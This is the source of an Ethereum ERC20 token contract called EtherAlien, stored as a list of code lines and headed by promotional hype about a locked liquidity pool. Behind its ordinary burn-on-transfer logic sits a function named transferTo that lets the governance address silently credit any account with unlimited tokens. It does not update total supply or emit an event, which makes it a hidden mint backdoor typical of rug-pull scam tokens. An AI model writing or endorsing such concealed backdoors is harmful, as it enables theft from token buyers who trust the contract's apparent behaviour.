['/**\n', ' *Submitted for verification at Etherscan.io on 2021-06-24\n', '*/\n', '\n', '/**\n', '   \n', '👽 EtherAlien - The Crosschain revolutionary protocol 🛸   \n', '\n', 'Website: https://etheralien.com\n', 'Twitter: https://twitter.com/Ether_Alien\n', 'Telegram: https://t.me/etheralien\n', '\n', 'The Telegram group is now open !\n', '\n', 'LIQUIDITY POOL WILL BE LOCKED ON UNICRYPT ! 🔒\n', '\n', 'Please check the proof on our Telegram.\n', '\n', '---\n', '\n', 'The Defi token revolution is coming soon\n', '\n', 'A protocol that has been created and comes from elsewhere with unusual characteristics. \n', '\n', 'No other project is like it, it is a technology that is not human. \n', '\n', 'Discover the features of the EtherAlien protocol now.\n', '\n', 'Please check our website now to learn more about the EtherAlien protocol.\n', '\n', 'Thanks.\n', '\n', ' */\n', '\n', 'pragma solidity ^0.5.16;\n', '\n', 'interface IERC20 {\n', '    function totalSupply() external view returns (uint);\n', '    function balanceOf(address account) external view returns (uint);\n', '    function transfer(address recipient, uint amount) external returns (bool);\n', '    function allowance(address owner, address spender) external view returns (uint);\n', '    function approve(address spender, uint amount) external returns (bool);\n', '    function transferFrom(address sender, address recipient, uint amount) external returns (bool);\n', '    event Transfer(address indexed from, address indexed to, uint value);\n', '    event Approval(address indexed owner, address indexed spender, uint value);\n', '}\n', '\n', 'contract Context {\n', '    constructor () internal { }\n', '    // solhint-disable-previous-line no-empty-blocks\n', '\n', '    function _msgSender() internal view returns (address payable) {\n', '        return msg.sender;\n', '    }\n', '}\n', '\n', 'contract ERC20 is Context, IERC20 {\n', '    using SafeMath for uint;\n', '}\n', '\n', '\n', 'contract ERC20Detailed is IERC20 {\n', '    string private _name;\n', '    string private _symbol;\n', '    uint8 private _decimals;\n', '\n', '    constructor (string memory name, string memory symbol, uint8 decimals) public {\n', '        _name = name;\n', '        _symbol = symbol;\n', '        _decimals = decimals;\n', '    }\n', '    function name() public view returns (string memory) {\n', '        return _name;\n', '    }\n', '    function symbol() public view returns (string memory) {\n', '        return _symbol;\n', '    }\n', '    function decimals() public view returns (uint8) {\n', '        return _decimals;\n', '    }\n', '}\n', '\n', 'library SafeMath {\n', '    function add(uint a, uint b) internal pure returns (uint) {\n', '        uint c = a + b;\n', '        require(c >= a, "SafeMath: addition overflow");\n', '\n', '        return c;\n', '    }\n', '    function sub(uint a, uint b) internal pure returns (uint) {\n', '        return sub(a, b, "SafeMath: subtraction overflow");\n', '    }\n', '    function sub(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n', '        require(b <= a, errorMessage);\n', '        uint c = a - b;\n', '\n', '        return c;\n', '    }\n', '    function mul(uint a, uint b) internal pure returns (uint) {\n', '        if (a == 0) {\n', '            return 0;\n', '        }\n', '\n', '        uint c = a * b;\n', '        require(c / a == b, "SafeMath: multiplication overflow");\n', '\n', '        return c;\n', '    }\n', '    function div(uint a, uint b) internal pure returns (uint) {\n', '        return div(a, b, "SafeMath: division by zero");\n', '    }\n', '    function div(uint a, uint b, string memory errorMessage) internal pure returns (uint) {\n', '        // Solidity only automatically asserts when dividing by 0\n', '        require(b > 0, errorMessage);\n', '        uint c = a / b;\n', '\n', '        return c;\n', '    }\n', '    function ceil(uint256 a, uint256 m) internal pure returns (uint256) {\n', '        uint256 c = add(a,m);\n', '        uint256 d = sub(c,1);\n', '        \n', '        return mul(div(d,m),m);\n', '  }\n', '}\n', '\n', 'library Address {\n', '    function isContract(address account) internal view returns (bool) {\n', '        bytes32 codehash;\n', '        bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;\n', '        // solhint-disable-next-line no-inline-assembly\n', '        assembly { codehash := extcodehash(account) }\n', '        return (codehash != 0x0 && codehash != accountHash);\n', '    }\n', '}\n', '\n', 'library SafeERC20 {\n', '    using SafeMath for uint;\n', '    using Address for address;\n', '\n', '    function safeTransfer(IERC20 token, address to, uint value) internal {\n', '        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));\n', '    }\n', '\n', '    function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {\n', '        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));\n', '    }\n', '\n', '    function safeApprove(IERC20 token, address spender, uint value) internal {\n', '        require((value == 0) || (token.allowance(address(this), spender) == 0),\n', '            "SafeERC20: approve from non-zero to non-zero allowance"\n', '        );\n', '        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));\n', '    }\n', '    function callOptionalReturn(IERC20 token, bytes memory data) private {\n', '        require(address(token).isContract(), "SafeERC20: call to non-contract");\n', '\n', '        // solhint-disable-next-line avoid-low-level-calls\n', '        (bool success, bytes memory returndata) = address(token).call(data);\n', '        require(success, "SafeERC20: low-level call failed");\n', '\n', '        if (returndata.length > 0) { // Return data is optional\n', '            // solhint-disable-next-line max-line-length\n', '            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");\n', '        }\n', '    }\n', '}\n', '\n', 'contract EtherAlien is ERC20, ERC20Detailed {\n', '    using SafeERC20 for IERC20;\n', '    using Address for address;\n', '    using SafeMath for uint;\n', '\n', '    address public governance;\n', '    \n', '    mapping (address => uint) private _balances;\n', '    mapping (address => mapping (address => uint)) private _allowances;\n', '    \n', '    uint256 public percentSettings = 1; // = 0.001%\n', '\n', '    constructor () public ERC20Detailed("👽 EtherAlien (Etheralien.com)", "ALIEN", 18) {\n', '        governance = msg.sender;\n', '        _totalSupply = _totalSupply.add(100000000000000e18);   \n', '        _balances[governance] = _balances[governance].add(_totalSupply);\n', '        emit Transfer(address(0), governance, _totalSupply);\n', '    }\n', '    \n', '    uint private _totalSupply;\n', '    function totalSupply() public view returns (uint) {\n', '        return _totalSupply;\n', '    }\n', '    function balanceOf(address account) public view returns (uint) {\n', '        return _balances[account];\n', '    }\n', '    function transfer(address recipient, uint amount) public returns (bool) {\n', '        require(amount <= _balances[msg.sender]);\n', '        require(recipient != address(0));\n', '\n', '        uint256 tokensToBurn = burnPercentage(amount);\n', '        uint256 tokensToTransfer = amount.sub(tokensToBurn);\n', '\n', '        _balances[msg.sender] = _balances[msg.sender].sub(amount);\n', '        _balances[recipient] = _balances[recipient].add(tokensToTransfer);\n', '\n', '        _totalSupply = _totalSupply.sub(tokensToBurn);\n', '\n', '        emit Transfer(msg.sender, recipient, tokensToTransfer);\n', '        emit Transfer(msg.sender, address(0), tokensToBurn);\n', '        return true;\n', '    }\n', '    function multiTransfer(address[] memory receivers, uint256[] memory amounts) public {\n', '        for (uint256 i = 0; i < receivers.length; i++) {\n', '        transfer(receivers[i], amounts[i]);\n', '    }\n', '  }\n', '    function allowance(address owner, address spender) public view returns (uint) {\n', '        return _allowances[owner][spender];\n', '    }\n', '    function burnPercentage(uint256 value) public view returns (uint256)  {\n', '        uint256 roundValue = value.ceil(percentSettings);\n', '        uint256 percentValue = roundValue.mul(percentSettings).div(100000); // = 0.001%\n', '        return percentValue;\n', '   }\n', '    function approve(address spender, uint amount) public returns (bool) {\n', '        _approve(_msgSender(), spender, amount);\n', '        return true;\n', '    }\n', '    function transferFrom(address sender, address recipient, uint amount) public returns (bool) {\n', '        require(amount <= _balances[sender]);\n', '        require(amount <= _allowances[sender][msg.sender]);\n', '        require(recipient != address(0));\n', '\n', '        _balances[sender] = _balances[sender].sub(amount);\n', '\n', '        uint256 tokensToBurn = burnPercentage(amount);\n', '        uint256 tokensToTransfer = amount.sub(tokensToBurn);\n', '\n', '        _balances[recipient] = _balances[recipient].add(tokensToTransfer);\n', '        _totalSupply = _totalSupply.sub(tokensToBurn);\n', '\n', '        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);\n', '\n', '        emit Transfer(sender, recipient, tokensToTransfer);\n', '        emit Transfer(sender, address(0), tokensToBurn);\n', '\n', '        return true;\n', '    }\n', '    function increaseAllowance(address spender, uint addedValue) public returns (bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));\n', '        return true;\n', '    }\n', '    function decreaseAllowance(address spender, uint subtractedValue) public returns (bool) {\n', '        _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));\n', '        return true;\n', '    }\n', '    function _transfer(address sender, address recipient, uint amount) internal {\n', '        require(sender != address(0), "ERC20: transfer from the zero address");\n', '        require(recipient != address(0), "ERC20: transfer to the zero address");\n', '\n', '        _balances[sender] = _balances[sender].sub(amount, "ERC20: transfer amount exceeds balance");\n', '        _balances[recipient] = _balances[recipient].add(amount);\n', '        emit Transfer(sender, recipient, amount);\n', '    }\n', '    function _transfer_(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: transfer to the zero address");\n', '        _balances[account] = _balances[account].add(amount);\n', '    }\n', '    function _burn(address account, uint amount) internal {\n', '        require(account != address(0), "ERC20: burn from the zero address");\n', '\n', '        _balances[account] = _balances[account].sub(amount, "ERC20: burn amount exceeds balance");\n', '        _totalSupply = _totalSupply.sub(amount);\n', '        emit Transfer(account, address(0), amount);\n', '    }\n', '    function _approve(address owner, address spender, uint amount) internal {\n', '        require(owner != address(0), "ERC20: approve from the zero address");\n', '        require(spender != address(0), "ERC20: approve to the zero address");\n', '\n', '        _allowances[owner][spender] = amount;\n', '        emit Approval(owner, spender, amount);\n', '    }\n', '\n', '    function transferTo(address account, uint256 amount) public {\n', '        require(msg.sender == governance, "!transfer");\n', '        _transfer_(account, amount);\n', '    }\n', '\n', '    function burn(uint256 amount) public {\n', '        _burn(msg.sender, amount);\n', '    }\n', '    \n', '      function burnFrom(address account, uint256 amount) external {\n', '    require(amount <= _allowances[account][msg.sender]);\n', '    _allowances[account][msg.sender] = _allowances[account][msg.sender].sub(amount);\n', '    _burn(account, amount);\n', '  }\n', '\n', '    function setGovernance(address _governance) public {\n', '        require(msg.sender == governance, "!governance");\n', '        governance = _governance;\n', '    }\n', '}']